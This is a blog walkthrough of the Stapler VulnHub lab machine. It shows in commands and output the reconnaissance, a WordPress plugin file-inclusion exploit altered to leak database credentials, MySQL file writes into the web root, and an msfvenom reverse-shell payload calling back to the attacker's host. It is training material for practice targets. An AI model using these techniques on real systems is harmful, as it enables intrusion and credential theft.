<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="Stapler" /><meta name="author" content="Travis Mathison" /><meta property="og:locale" content="en" /><meta name="description" content="Stapler Intro This is my walkthrough of the Stapler vulnhub machine. You can find this machine at Stapler. If you want to attempt to hack into this machine without spoilers, don’t read the rest of this walkthrough." /><meta property="og:description" content="Stapler Intro This is my walkthrough of the Stapler vulnhub machine. You can find this machine at Stapler. If you want to attempt to hack into this machine without spoilers, don’t read the rest of this walkthrough." /><link rel="canonical" href="https://tdmathison.github.io/posts/stapler/" /><meta property="og:url" content="https://tdmathison.github.io/posts/stapler/" /><meta property="og:site_name" content="Travis Mathison" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2017-07-28T12:00:00-07:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Stapler" /><meta name="twitter:site" content="@ciph34block" /><meta name="twitter:creator" content="@Travis Mathison" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"Travis Mathison"},"description":"Stapler Intro This is my walkthrough of the Stapler vulnhub machine. You can find this machine at Stapler. If you want to attempt to hack into this machine without spoilers, don’t read the rest of this walkthrough.","url":"https://tdmathison.github.io/posts/stapler/","@type":"BlogPosting","headline":"Stapler","dateModified":"2020-10-02T23:28:29-07:00","datePublished":"2017-07-28T12:00:00-07:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://tdmathison.github.io/posts/stapler/"},"@context":"https://schema.org"}</script><title>Stapler | Travis Mathison</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Travis Mathison"><meta name="application-name" content="Travis Mathison"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/profile.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Travis Mathison</a></div><div class="site-subtitle font-italic">Malware Reverse Engineering and Threat Research.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/resources/" class="nav-link"> <i class="fa-fw fas fa-book ml-xl-3 mr-xl-3 unloaded"></i> <span>RESOURCES</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/tdmathison" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/ciph34block" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a> <a href="https://www.linkedin.com/in/travismathison/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Stapler</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Stapler</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Travis Mathison </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, Jul 28, 2017, 12:00 PM -0700" >Jul 28, 2017<i class="unloaded">2017-07-28T12:00:00-07:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Fri, Oct 2, 2020, 11:28 PM -0700" >Oct 2, 2020<i class="unloaded">2020-10-02T23:28:29-07:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2643 words">14 min read</span></div></div><div class="post-content"><h1 id="stapler">Stapler</h1><h2 id="intro">Intro</h2><p>This is my walkthrough of the Stapler vulnhub machine. You can find this machine at <a href="https://www.vulnhub.com/entry/stapler-1,150/">Stapler</a>. If you want to attempt to hack into this machine without spoilers, don’t read the rest of this walkthrough.</p><h2 id="located-machine-on-network">Located machine on network</h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>root@sengen-kali:~/vulnhub/stapler# nmap 192.168.56.0/24 -sn

Starting Nmap 7.50 ( https://nmap.org ) at 2017-07-28 10:16 PDT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.1
Host is up (0.00013s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.100
Host is up (0.00023s latency).
MAC Address: 08:00:27:3C:94:BA (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.102
Host is up (0.00032s latency).
MAC Address: 08:00:27:51:F5:BC (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.101
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 4.98 seconds
</pre></table></code></div></div><h2 id="performed-onetwopunch--nmap-scans">Performed onetwopunch / nmap scans</h2><p>Using the onetwopunch script which combines unicornscan and nmap I scanned the machine looking for open ports.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>root@sengen-kali:~/vulnhub/stapler# ~/onetwopunch.sh -t target.txt -p all -n "-A -sV"
</pre></table></code></div></div><p>[*] TCP ports for nmap to scan: 21,22,53,80,139,666,3306,12380<br /> [*] UDP ports for nmap to scan: 53,137,45018</p><p>Based on our initial scan the following software/versions are revealed<br /> 21/tcp open ftp vsftpd 2.0.8 or later<br /> 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)<br /> 53/tcp open domain dnsmasq 2.75<br /> 80/tcp open http PHP cli server 5.5 or later<br /> 139/tcp open netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)<br /> 3306/tcp open mysql MySQL 5.7.12-0ubuntu1<br /> 12380/tcp open http Apache httpd 2.4.18 ((Ubuntu))</p><h2 id="looking-into-web-ports">Looking into web ports</h2><p>Will start by investigating the web ports which appear to be 80 and 12380<br /> <i>Protip: when using curl against the sites you should add the <code class="language-plaintext highlighter-rouge">--insecure</code> or <code class="language-plaintext highlighter-rouge">-k</code> switch so that you get results back even if it doesn’t have a valid cert. If I did not do this I would have seen nothing come back for SSL on 12380</i></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>root@sengen-kali:~/vulnhub/stapler# curl -s -k http://192.168.56.102:80 | html2text
****** Not Found ******
The requested resource / was not found on this server.
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>root@sengen-kali:~/vulnhub/stapler# curl -s -k http://192.168.56.102:12380 | html2text

****** Coming Soon ******
*** Sorry guys, BSides happened too quick! Didn't have enough time to finish
the website. ***
** Try again next year. **
Made with  by Creative_Tim. Free download here.
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>root@sengen-kali:~/vulnhub/stapler# curl -s -k https://192.168.56.102:12380 | html2text
Internal Index Page!
</pre></table></code></div></div><h2 id="the-web-site-on-port-12380-seems-to-contain-something-of-interest-but-well-gobuster-them-all">The web site on port 12380 seems to contain something of interest but we’ll gobuster them all</h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>root@sengen-kali:~/vulnhub/stapler# gobuster -u http://192.168.56.102:80 -w /usr/share/wordlists/SecLists/Discovery/Web_Content/common.txt

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.56.102:80/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/SecLists/Discovery/Web_Content/common.txt
[+] Status codes : 200,204,301,302,307
=====================================================
/.bashrc (Status: 200)
/.profile (Status: 200)
=====================================================
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>root@sengen-kali:~/vulnhub/stapler# gobuster -u http://192.168.56.102:12380 -w /usr/share/wordlists/SecLists/Discovery/Web_Content/common.txt

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.56.102:12380/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/SecLists/Discovery/Web_Content/common.txt
[+] Status codes : 200,204,301,302,307
=====================================================
=====================================================
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>root@sengen-kali:~/vulnhub/stapler# gobuster -u https://192.168.56.102:12380 -w /usr/share/wordlists/SecLists/Discovery/Web_Content/common.txt

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : https://192.168.56.102:12380/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/SecLists/Discovery/Web_Content/common.txt
[+] Status codes : 200,204,301,302,307
=====================================================
/announcements (Status: 301)
/index.html (Status: 200)
/javascript (Status: 301)
/phpmyadmin (Status: 301)
/robots.txt (Status: 200)
=====================================================
</pre></table></code></div></div><p>I noticed .bashrc and .profile files were on port 80 and looked at them with the following commands. These usually reside at the root of a users home directory so this is odd and may indicated that the port 80 web is actually mounted at an actual home directory (or this is a red herring to throw us off)</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>root@sengen-kali:~/vulnhub/stapler# curl -s -k http://192.168.56.102:80/.bashrc
root@sengen-kali:~/vulnhub/stapler# curl -s -k http://192.168.56.102:80/.profile
</pre></table></code></div></div><p>Nothing of interest was in these files as they looked pretty normal to me.</p><h2 id="ssl-on-12380">SSL on 12380</h2><p>SSL on 12380 is another story… a lot is going on here. Need to check robots.txt and /phpmyadmin is always a top target</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>root@sengen-kali:~/vulnhub/stapler# curl -s -k https://192.168.56.102:12380/robots.txt
User-agent: *
Disallow: /admin112233/
Disallow: /blogblog/
</pre></table></code></div></div><h3 id="tried-default-credentials">Tried default credentials</h3><p>Attempted several default credentials against https://192.168.56.102:12380/phpmyadmin/index.php but none of them worked</p><h3 id="looked-at-https1921685610212380admin112233">Looked at https://192.168.56.102:12380/admin112233</h3><p>When using curl the javascript doesn’t run but when navigating to it through the browser it does and states “This could of been a BeEF-XSS hook ;)” which doesn’t look like anything for us to exploit but it could be bade if we were hit with this for real in an actual environment (you would not see the message box of course).</p><h3 id="looked-at-https1921685610212380blogblog">Looked at https://192.168.56.102:12380/blogblog/</h3><p>This is a WordPress blog site. Has a couple posts and the next thing should be running a wpscan against it to see if we can find any vulnerabilities with it.</p><h3 id="ran-wordpress-scan-wpscan">Ran WordPress Scan (wpscan)</h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>root@sengen-kali:~/vulnhub/stapler# wpscan --url https://192.168.56.102:12380/blogblog --disable-tls-checks
[+] URL: https://192.168.56.102:12380/blogblog/
[+] Started: Fri Jul 28 12:19:23 2017

[!] The WordPress 'https://192.168.56.102:12380/blogblog/readme.html' file exists exposing a version number
[+] Interesting header: DAVE: Soemthing doesn't look right here
[+] Interesting header: SERVER: Apache/2.4.18 (Ubuntu)
[!] Registration is enabled: https://192.168.56.102:12380/blogblog/wp-login.php?action=register
[+] XML-RPC Interface available under: https://192.168.56.102:12380/blogblog/xmlrpc.php
[!] Upload directory has directory listing enabled: https://192.168.56.102:12380/blogblog/wp-content/uploads/
[!] Includes directory has directory listing enabled: https://192.168.56.102:12380/blogblog/wp-includes/

[+] WordPress version 4.2.1 (Released on 2015-04-27) identified from advanced fingerprinting, meta generator, readme, links opml, stylesheets numbers
[!] 41 vulnerabilities identified from the version number

&lt;cut for brevity&gt;
</pre></table></code></div></div><p>A lot of XSS and CSRF vulnerabilites which probably won’t apply to us for this type of machine. The ones that stood out as possibilities are below:<br /></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>[!] Title: WordPress 3.5-4.7.1 - WP_Query SQL Injection&lt;br /&gt;
    Reference: https://wpvulndb.com/vulnerabilities/8730&lt;br /&gt;
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/&lt;br /&gt;
    Reference: https://github.com/WordPress/WordPress/commit/85384297a60900004e27e417eac56d24267054cb&lt;br /&gt;
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5611&lt;br /&gt;
[i] Fixed in: 4.2.12&lt;br /&gt;

[!] Title: WordPress 2.3-4.7.5 - Host Header Injection in Password Reset&lt;br /&gt;
    Reference: https://wpvulndb.com/vulnerabilities/8807&lt;br /&gt;
    Reference: https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html&lt;br /&gt;
    Reference: http://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html&lt;br /&gt;
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295&lt;br /&gt;
</pre></table></code></div></div><p>Some directory listings are said to be available as well so it is always a good idea to check that out especially to find plugins used.</p><p>Navigated to https://192.168.56.102:12380/blogblog/wp-content/uploads/ which was an empty directory. I did a quick check to see if I could “PUT” files there via the following command (PUT is not among the available VERBS):</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>root@sengen-kali:~/vulnhub/stapler# curl -vX OPTIONS https://192.168.56.102:12380/blogblog/wp-content/uploads/ -k
...
&lt; HTTP/1.1 200 OK
&lt; Date: Fri, 28 Jul 2017 12:27:51 GMT
&lt; Server: Apache/2.4.18 (Ubuntu)
&lt; Allow: GET,HEAD,POST,OPTIONS
&lt; Dave: Soemthing doesn't look right here
&lt; Content-Length: 0
&lt; Content-Type: httpd/unix-directory
...
</pre></table></code></div></div><h2 id="wordpress-plugins">WordPress Plugins</h2><p>Through traversal I got to the plugins directory at https://192.168.56.102:12380/blogblog/wp-content/plugins/ which listed the following (NOTE: I also ran wpscan with <code class="language-plaintext highlighter-rouge">--enumerate p</code> but it did not show all of these plugins here so if you can get directory browsing you should always double-check what wpscan tells you): <img data-proofer-ignore data-src="https://tdmathison.github.io/assets/img/ctf/stapler_1.png" /></p><h3 id="some-version-information-extracted-from-the-files-in-the-plugin-directories">Some version information extracted from the files in the plugin directories</h3><p>two-factor = not sure<br /> shortcode-ui = 0.4.0<br /> advanced video = 1.0<br /></p><h3 id="used-searchsploit-to-check-for-any-known-issues-and-the-following-came-up-as-the-most-promising">Used searchsploit to check for any known issues and the following came up as the most promising</h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>root@sengen-kali:~/vulnhub/stapler# searchsploit advanced video
----------------------------------------------------------------------------------------------- ----------------------------------
 Exploit Title                                                                                 |  Path
                                                                                               | (/usr/share/exploitdb/platforms/)
----------------------------------------------------------------------------------------------- ----------------------------------
WordPress Plugin Advanced Video 1.0 - Local File Inclusion                                     | php/webapps/39646.py
----------------------------------------------------------------------------------------------- ----------------------------------
</pre></table></code></div></div><h3 id="i-downloaded-this-python-file-and-updated-it-for-my-target">I downloaded this python file and updated it for my target</h3><p>Changed:<br /> <code class="language-plaintext highlighter-rouge">url = "http://127.0.0.1/wordpress"</code><br /> To<br /> <code class="language-plaintext highlighter-rouge">url = "https://192.168.56.102:12380/blogblog"</code></p><p>I ran the script and it failed complaining about SSL issues<br /> <i>urllib2.URLError: &lt;urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:661)&gt;</i><br /></p><p>Fine, I can fix this script with some simple python changes to make it not care about that.</p><h3 id="added-the-following-to-the-top-of-the-script">Added the following to the top of the script</h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>import ssl 
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
</pre></table></code></div></div><h3 id="made-the-urlopen-calls-use-this-new-context-i-created">Made the urlopen calls use this new context I created</h3><p>Changed:<br /> <code class="language-plaintext highlighter-rouge">objHtml = urllib2.urlopen(url + '/wp-admin/admin-ajax.php?action=ave_publishPost&amp;title=' + str(randomID) + '&amp;short=rnd&amp;term=rnd&amp;thumb=../wp-config.php')</code> To:<br /> <code class="language-plaintext highlighter-rouge">objHtml = urllib2.urlopen(url + '/wp-admin/admin-ajax.php?action=ave_publishPost&amp;title=' + str(randomID) + '&amp;short=rnd&amp;term=rnd&amp;thumb=../wp-config.php', context=ctx)</code> <br /><br /> Changed:<br /> <code class="language-plaintext highlighter-rouge">objHtml = urllib2.urlopen(url + '/?p=' + str(id))</code><br /> To:<br /> <code class="language-plaintext highlighter-rouge">objHtml = urllib2.urlopen(url + '/?p=' + str(id), context=ctx)</code></p><h3 id="ran-the-exploit-again-and-it-successfully-created-a-260355091jpeg-file-in-the-uploads-directory">Ran the exploit again and it successfully created a 260355091.jpeg file in the uploads directory</h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>root@sengen-kali:~/vulnhub/stapler# curl -k https://192.168.56.102:12380/blogblog/wp-content/uploads/260355091.jpeg
...
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'plbkac');

/** MySQL hostname */
define('DB_HOST', 'localhost');
...
</pre></table></code></div></div><h3 id="this-gave-us-the-credentials-needed-to-log-into-the-phpmyadmin-site">This gave us the credentials needed to log into the phpmyadmin site</h3><p><img data-proofer-ignore data-src="https://tdmathison.github.io/assets/img/ctf/stapler_2.png" /></p><p>Often you can update a page to put a reverse shell in. I often do this if a template/theme is available. It is possible that I could download the theme, update it, and then re-upload it to make this work with export/import.<br /></p><p>After browing in phpmyadmin for a little bit I realized that 3306 was open publically and it was MySQL. Maybe, if I’m lucky I can connect remotely and write shellcode through the SQL.</p><h2 id="connecting-to-mysql-remotely">Connecting to MySQL remotely</h2><p><img data-proofer-ignore data-src="https://tdmathison.github.io/assets/img/ctf/stapler_3.png" /></p><p>We are connected and from experience my first test here is whether or not <code class="language-plaintext highlighter-rouge">select into outfile</code> works. If it does, then we can drop a shell file into the web directory to gain a shell.</p><p>We know the end path is <code class="language-plaintext highlighter-rouge">/blogblog/wp-content/uploads/</code> so we need to figure out where this is relative from. In general, the default locations to try are <code class="language-plaintext highlighter-rouge">/var/www</code> and <code class="language-plaintext highlighter-rouge">/var/www/html</code>. In this case, through trial-and-error I found that it was <code class="language-plaintext highlighter-rouge">/var/www/https</code>. The https instead of html for the directory tripped me up for awhile but finally got a good test file to drop into the uploads directory.</p><p><img data-proofer-ignore data-src="https://tdmathison.github.io/assets/img/ctf/stapler_4.png" /></p><p>Success!</p><h2 id="creating-real-php-shellcode-and-dropping-it-onto-the-server-using-the-same-technique">Creating real PHP shellcode and dropping it onto the server using the same technique</h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>root@sengen-kali:~/vulnhub/stapler# msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=443 -e php/base64 &gt; shell.php
No platform was selected, choosing Msf::Module::Platform::PHP from the payload
No Arch selected, selecting Arch: php from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of php/base64
php/base64 succeeded with size 1289 (iteration=0)
php/base64 chosen with final size 1289
Payload size: 1289 bytes
</pre></table></code></div></div><p>The resulting shellcode needs <code class="language-plaintext highlighter-rouge">&lt;?php ?&gt;</code> added into it turning it into the following</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
